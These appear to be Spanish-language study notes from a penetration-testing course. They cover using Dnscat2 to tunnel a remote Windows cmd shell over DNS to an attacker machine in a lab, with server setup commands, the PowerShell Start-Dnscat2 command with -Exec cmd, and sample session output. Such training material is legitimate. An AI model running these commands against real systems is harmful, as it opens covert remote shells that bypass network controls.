
## 1. Concepto

**Dnscat2** es una herramienta de tunelización que utiliza el protocolo DNS para transmitir datos entre dos hosts. Permite establecer un canal de comunicación cifrado entre un cliente y un servidor.

Características principales:

- Utiliza el protocolo DNS para transportar datos.
    
- Puede incluir información en registros DNS TXT.
    
- Establece un canal cifrado de comunicación.
    
- Permite interactuar con una sesión remota desde el servidor Dnscat2.
    
- Puede utilizarse en escenarios donde las conexiones DNS están permitidas, aunque otros protocolos estén restringidos.
    

En el escenario del módulo, ejecutamos el servidor Dnscat2 en nuestra máquina de ataque y el cliente en un objetivo Windows.

## 2. Instalar y preparar Dnscat2

Clonamos el repositorio en la máquina de ataque:

```
git clone https://github.com/iagox86/dnscat2.git
```

Accedemos al directorio del servidor e instalamos las dependencias:

```
cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```

## 3. Iniciar el servidor Dnscat2

En la máquina de ataque, ejecutamos:

```
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```

### Parámetros

|Parámetro|Descripción|
|---|---|
|`--dns`|Configura los parámetros DNS del servidor.|
|`host=10.10.14.18`|Dirección IP local en la que escucha el servidor.|
|`port=53`|Puerto DNS utilizado por el servidor.|
|`domain=inlanefreight.local`|Dominio utilizado en la configuración del túnel.|
|`--no-cache`|Desactiva la caché DNS del servidor Dnscat2.|

Si el servidor se inicia correctamente, mostrará información sobre la conexión y generará un secreto precompartido (_pre-shared secret_).

Ejemplo de salida:

```
Starting Dnscat2 DNS server on 10.10.14.18:53
[domains = inlanefreight.local]
```

**Importante:** el secreto generado por el servidor debe coincidir con el utilizado por el cliente para establecer una sesión cifrada y autenticada.

## 4. Preparar el cliente para Windows

El módulo presenta `dnscat2-powershell`, un cliente compatible con Dnscat2 que permite establecer el túnel desde PowerShell.

Clonamos el repositorio en la máquina de ataque:

```
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

Después, debemos transferir el archivo `dnscat2.ps1` al objetivo Windows utilizando un método de transferencia disponible en el laboratorio.

## 5. Importar el módulo en PowerShell

En el objetivo Windows, accedemos al directorio que contiene el archivo y lo importamos:

```
Import-Module .\dnscat2.ps1
```

Esto carga las funciones proporcionadas por el módulo para poder utilizarlas desde PowerShell.

## 6. Establecer la conexión con el servidor

El ejemplo del módulo utiliza el siguiente comando:

```
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret <SECRETO_PRECOMPARTIDO> -Exec cmd
```

Sustituye `<SECRETO_PRECOMPARTIDO>` por el secreto generado por tu propio servidor Dnscat2.

### Parámetros

|Parámetro|Descripción|
|---|---|
|`-DNSserver`|Dirección IP del servidor Dnscat2.|
|`-Domain`|Dominio utilizado por el túnel DNS.|
|`-PreSharedSecret`|Secreto que permite autenticar y cifrar la comunicación.|
|`-Exec cmd`|Indica que se ejecute `cmd` como proceso asociado a la sesión.|

Si la conexión se establece correctamente, el servidor mostrará una sesión nueva.

Salida de ejemplo:

```
New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
```

El mensaje confirma que la sesión se encuentra cifrada y verificada.

## 7. Interactuar con la sesión

Una vez establecida la conexión, podemos consultar los comandos disponibles desde el prompt de Dnscat2:

```
dnscat2> ?
```

Entre los comandos que muestra el módulo están:

|Comando|Función general|
|---|---|
|`help`|Muestra ayuda.|
|`windows`|Muestra las ventanas disponibles.|
|`window`|Permite seleccionar o interactuar con una ventana.|
|`sessions`|No aparece en la lista del ejemplo; consulta la ayuda de la versión utilizada.|
|`tunnels`|Gestiona o muestra información sobre túneles.|
|`kill`|Finaliza una sesión o ventana según el contexto del comando.|
|`quit`|Sale de la consola.|

Para interactuar con la sesión del ejemplo:

```
dnscat2> window -i 1
```

El argumento `-i 1` selecciona la ventana identificada con el número `1`.

Si la sesión contiene una consola de Windows, podremos interactuar con ella. La salida del módulo muestra un prompt similar a:

```
C:\Windows\system32>
```

Para regresar a la consola de Dnscat2, el ejemplo indica que se puede utilizar `Ctrl+Z`.

## 8. Flujo de funcionamiento

```
Máquina de ataque
       |
       | Servidor Dnscat2
       | UDP/53
       v
Comunicación mediante DNS
       |
       v
Cliente Dnscat2 en Windows
       |
       v
Sesión cifrada
       |
       v
Interacción con la consola remota
```

El cliente y el servidor utilizan el secreto compartido para establecer una sesión cifrada y verificada.

## 9. Puntos clave para el examen

- Dnscat2 permite crear túneles utilizando el protocolo DNS.
    
- El módulo describe el transporte de datos mediante registros TXT.
    
- El servidor se ejecuta con `dnscat2.rb`.
    
- El cliente de PowerShell se proporciona mediante `dnscat2-powershell`.
    
- El secreto precompartido debe coincidir entre el cliente y el servidor.
    
- El servidor del ejemplo utiliza el puerto DNS `53`.
    
- `Start-Dnscat2` inicia la conexión desde Windows.
    
- `-Exec cmd` indica que se ejecute una consola CMD.
    
- `window -i 1` permite interactuar con la ventana identificada como `1`.
    
- El mensaje `ENCRYPTED AND VERIFIED` indica que la sesión se ha establecido con cifrado y verificación.
    
- El uso de DNS no garantiza que el túnel vaya a funcionar: las consultas pueden estar bloqueadas, filtradas o monitorizadas.
